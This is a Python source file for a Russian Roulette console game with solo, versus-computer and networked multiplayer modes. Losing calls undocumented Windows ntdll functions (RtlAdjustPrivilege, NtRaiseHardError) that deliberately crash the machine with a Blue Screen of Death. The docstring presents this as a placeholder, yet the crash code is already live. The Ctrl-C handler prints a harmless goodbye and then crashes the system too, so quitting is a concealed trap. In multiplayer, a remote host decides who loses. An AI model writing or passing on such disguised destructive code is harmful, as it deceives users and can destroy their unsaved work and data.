"""
Simple Russian Roulette game in Python.
On a loss, calls trigger_blue_screen() where you can implement actual bluescreen logic.
"""
import random
import sys
import ctypes
import time
import signal
import socket

def trigger_blue_screen():
    """
    Triggers a Windows Blue Screen of Death (BSOD) via ctypes.
    """
    # Enable SeShutdownPrivilege (19) for current process
    prev = ctypes.c_bool()
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev))
    # Raise hard error to cause BSOD
    resp = ctypes.c_ulong()
    ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, None, 6, ctypes.byref(resp))

def pc_loss_message():
    """
    Prints a message when the PC loses.
    """
    print("PC: Well played, you win this round!")

# Multiplayer support
def play_multiplayer(chambers=6):
    # choose role with validation
    while True:
        role = input("Join(j)/Host(h) [default Join]: ").strip().lower() or 'j'
        if role in ('j','h'): break
        print("Invalid choice. Enter 'j' to join or 'h' to host.")
    if role == 'h':
        host_multiplayer(chambers)
    else:
        join_multiplayer(chambers)

def host_multiplayer(chambers):
    total = int(input("Enter total number of players (including you): "))
    port = input("Enter port [Default 5000]: ").strip()
    port = int(port) if port else 5000
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('', port))
    server.listen(total - 1)
    # Display host IP and port for others to join
    try:
        tmp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        tmp_sock.connect(("8.8.8.8", 80))
        host_ip = tmp_sock.getsockname()[0]
        tmp_sock.close()
    except:
        host_ip = socket.gethostbyname(socket.gethostname())
    print(f"Host IP: {host_ip}:{port} — share this address with players to join")
    print(f"Waiting for {total - 1} player(s) to join on port {port}...")
    clients = []
    for i in range(total - 1):
        conn, addr = server.accept()
        print(f"Player {i + 1} connected from {addr}")
        clients.append(conn)
    for idx, conn in enumerate(clients, start=1):
        conn.send(f"INIT:{idx}:{total}:{chambers}".encode())
    print("All players connected. Starting game.")
    loser = winner = None
    bullet = random.randint(0, chambers - 1)
    position = 0
    turn = 0
    while True:
        if turn == 0:
            input("Your turn! Press Enter to pull the trigger...")
        else:
            clients[turn - 1].send("YOUR_TURN".encode())
            data = clients[turn - 1].recv(1024).decode().strip()
        if position == bullet:
            loser = turn
            winner = (turn + 1) % total
            # notify clients: GAME_OVER:loser:winner
            for c in clients:
                c.send(f"GAME_OVER:{loser}:{winner}".encode())
            break
        else:
            if turn == 0:
                print("Click... you survived this round.")
            else:
                print(f"Click... Player {turn} survived this round.")
            for c in clients:
                c.send(f"ROUND_RESULT:{turn}".encode())
            position = (position + 1) % chambers
            turn = (turn + 1) % total
    server.close()
    # process result
    if loser == 0:
        print("Bang! You died.")
        trigger_blue_screen()
    elif winner == 0:
        print("You won! Exiting safely.")
        sys.exit(0)
    else:
        print(f"Player {winner} won. Exiting.")
        sys.exit(0)

def join_multiplayer(chambers):
    # prompt until valid connection
    while True:
        host_ip = input("Enter Host IP: ").strip()
        port_str = input("Enter port [Default 5000]: ").strip() or '5000'
        try:
            port = int(port_str)
        except ValueError:
            print("Invalid port. Please enter a number.")
            continue
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            conn.connect((host_ip, port))
            break
        except Exception as e:
            print(f"Connection failed ({e}). Try again.")
            conn.close()
    data = conn.recv(1024).decode().strip().split(':')
    _, my_id, total, chambers = data
    my_id, total, chambers = int(my_id), int(total), int(chambers)
    print(f"Connected as Player {my_id}/{total}")
    while True:
        msg = conn.recv(1024).decode().strip().split(':')
        if msg[0] == 'YOUR_TURN':
            input("Your turn! Press Enter to pull the trigger...")
            conn.send("PULLED".encode())
        elif msg[0] == 'ROUND_RESULT':
            p = int(msg[1])
            if p == my_id:
                print("You survived this round.")
            else:
                print(f"Player {p} survived this round.")
        elif msg[0] == 'GAME_OVER':
            loser, winner = map(int, msg[1:3])
            if loser == my_id:
                print("Bang! You died.")
                trigger_blue_screen()
                return
            elif winner == my_id:
                print("You won! Exiting safely.")
                conn.close()
                sys.exit(0)
            else:
                print(f"Player {winner} won. Exiting.")
                conn.close()
                sys.exit(0)

def play_roulette(chambers=6):
    # choose game mode
    while True:
        mode = input("Choose mode: Solo(s)/Vs PC(p)/Multiplayer(m) [default Solo]: ").strip().lower() or 's'
        if mode in ('s','p','m'): break
        print("Invalid choice. Enter 's', 'p', or 'm'.")
    if mode == 'm':
        play_multiplayer(chambers)
        return
    vs_pc = (mode == 'p')
    # Randomly place a bullet in one of the chambers
    bullet = random.randint(0, chambers - 1)
    position = 0
    # 0 = user, 1 = PC
    turn = 0
    print(f"Welcome to Russian Roulette! There are {chambers} chambers.")
    print("Press Enter to pull the trigger, or type 'q' to quit.")

    while True:
        if vs_pc and turn == 1:
            print("PC is pulling the trigger...")
            time.sleep(1)
        else:
            # pull or quit
            while True:
                choice = input("Pull the trigger? Pull (p) / Quit (q) [default Pull]: ").strip().lower() or 'p'
                if choice in ('p','q'): break
                print("Invalid choice. Enter 'p' to pull or 'q' to quit.")
            if choice == 'q':
                print("The only winning move is not to play.")
                break

        # Check bullet
        if position == bullet:
            if turn == 0:
                print("Bang! You're dead.")
                trigger_blue_screen()
            else:
                pc_loss_message()
            break
        else:
            if turn == 0:
                print("Click... you survived this round.")
            else:
                print("Click... PC survived this round.")
            position = (position + 1) % chambers
            if vs_pc:
                turn = 1 - turn


if __name__ == '__main__':
    # Setup Ctrl-C handler with cooldown
    def handler(signum, frame):
        print("\nGame interrupted. Goodbye.")
        print("\nExiting in 3 seconds...")
        """
        Triggers a Windows Blue Screen of Death (BSOD) via ctypes.
        """
        # Enable SeShutdownPrivilege (19) for current process
        prev = ctypes.c_bool()
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev))
        # Raise hard error to cause BSOD
        resp = ctypes.c_ulong()
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, None, 6, ctypes.byref(resp))
        time.sleep(3)
        sys.exit(0)
    signal.signal(signal.SIGINT, handler)
    # replay loop with validation
    while True:
        play_roulette()
        while True:
            again = input("Play again? Yes(y)/No(n) [default Yes]: ").strip().lower() or 'y'
            if again in ('y','n'): break
            print("Invalid choice. Enter 'y' or 'n'.")
        if again == 'n':
            break
